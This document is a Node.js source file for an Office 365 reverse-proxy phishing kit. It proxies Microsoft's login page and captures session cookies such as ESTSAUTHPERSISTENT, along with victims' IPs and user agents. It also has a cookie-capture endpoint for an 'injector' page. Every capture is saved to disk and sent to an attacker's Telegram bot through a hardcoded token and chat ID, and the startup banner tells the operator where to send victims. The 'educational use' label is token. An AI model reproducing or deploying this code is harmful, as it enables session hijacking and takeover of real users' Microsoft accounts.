// =============================================
// OFFICE 365 COOKIE STEALER - FINAL FIX
// =============================================

const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',
    chatId: '7075480337'
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        
        const textResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        const textResult = await textResponse.text();
        console.log('📤 Text response:', textResult.substring(0, 200));
        
        if (fileData) {
            const FormData = require('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data - Office 365');
            
            const fileResponse = await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            const fileResult = await fileResponse.text();
            console.log('📤 File response:', fileResult.substring(0, 200));
        }
        
        console.log('✅ Telegram sent successfully!');
        return true;
        
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint',
        'x-ms-gateway-slice',
        'stsservicecookie',
        'msal',
        'clientid',
        'login_hint'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// ✅ FIXED: Real Microsoft Login Page Handler
// =============================================
app.get('/login', (req, res) => {
    // Redirect to Microsoft login with correct parameters
    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
        'client_id=c9a559d2-7aab-4f13-a6ed-e7e9c52aec87' +
        '&redirect_uri=https%3A%2F%2Fforms.cloud.microsoft%2Flanding' +
        '&response_type=code' +
        '&response_mode=form_post' +
        '&scope=openid%20profile%20offline_access' +  // ← ADDED SCOPE!
        '&prompt=select_account';
    
    console.log('🔄 Redirecting to Microsoft login...');
    res.redirect(loginUrl);
});

// =============================================
// ✅ FIXED: Proxy with CORRECT target
// =============================================
const proxyMiddleware = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    ws: true,
    cookieDomainRewrite: {
        '*': ''
    },
    onProxyReq: (proxyReq, req, res) => {
        console.log('\n🎯 PROXY REQUEST');
        console.log('📌 Method:', req.method);
        console.log('🌐 URL:', req.url);
        
        // Capture cookies from request
        const cookieHeader = req.headers.cookie || '';
        if (cookieHeader) {
            console.log('🍪 Cookies in request:', cookieHeader.substring(0, 100) + '...');
            
            const cookies = extractCookies({ cookie: cookieHeader });
            const officeCookies = extractOfficeCookies(cookies);
            const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
            
            console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
            console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
            
            if (hasFullSession) {
                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
            }
            
            const timestamp = new Date().toISOString();
            const sessionData = {
                timestamp: timestamp,
                method: 'PROXY',
                url: req.url,
                cookies: cookies,
                officeCookies: officeCookies,
                hasFullSession: hasFullSession,
                ip: req.ip || req.connection.remoteAddress,
                userAgent: req.headers['user-agent'] || 'unknown'
            };
            
            const filename = `session_proxy_${Date.now()}.json`;
            fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
            console.log(`📁 Saved: ${filename}`);
            
            if (Object.keys(officeCookies).length > 0 || hasFullSession) {
                let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
                message += `📅 <b>Time:</b> ${timestamp}\n`;
                message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
                message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
                
                if (hasFullSession) {
                    message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
                }
                
                sendToTelegram(message, sessionData).catch(console.error);
            }
        }
    },
    onProxyRes: (proxyRes, req, res) => {
        const setCookie = proxyRes.headers['set-cookie'];
        if (setCookie) {
            console.log('\n🍪 MICROSOFT SET COOKIES:');
            console.log(setCookie.join('\n'));
            
            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
            sendToTelegram(message).catch(console.error);
        }
    },
    onError: (err, req, res) => {
        console.error('❌ Proxy error:', err.message);
        res.status(500).send('Proxy error occurred');
    }
});

app.use('/proxy', proxyMiddleware);

// =============================================
// CAPTURE ENDPOINT
// =============================================
app.post('/capture', async (req, res) => {
    console.log('\n🎯 POST COOKIE CAPTURED!');
    
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    const cookies = extractCookies(req.headers);
    
    if (data.cookies && typeof data.cookies === 'object') {
        for (const [key, value] of Object.entries(data.cookies)) {
            if (!cookies[key]) {
                cookies[key] = value;
            }
        }
    }
    
    const officeCookies = extractOfficeCookies(cookies);
    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
    
    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
    
    if (hasFullSession) {
        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
    }
    
    const sessionData = {
        timestamp: timestamp,
        method: 'POST',
        url: data.url || req.headers.referer || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        ip: req.ip || req.connection.remoteAddress,
        cookies: cookies,
        officeCookies: officeCookies,
        hasFullSession: hasFullSession,
        rawData: data
    };
    
    const filename = `session_post_${Date.now()}.json`;
    fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
    console.log(`📁 Saved: ${filename}`);
    
    if (Object.keys(cookies).length > 0) {
        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${timestamp}\n`;
        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
        }
        
        await sendToTelegram(message, sessionData);
    }
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        officeCookies: Object.keys(officeCookies).length,
        hasFullSession: hasFullSession
    });
});

// =============================================
// LANDING PAGE
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// =============================================
// INJECTOR PAGE
// =============================================
app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 REVERSE PROXY STEALER                     ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                              ║
║                                                              ║
║   📌 SEND VICTIM TO:                                       ║
║   🔗 https://your-railway-url/login                        ║
║                                                              ║
║   ⚠️  FOR EDUCATIONAL USE ONLY!                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

module.exports = { app };
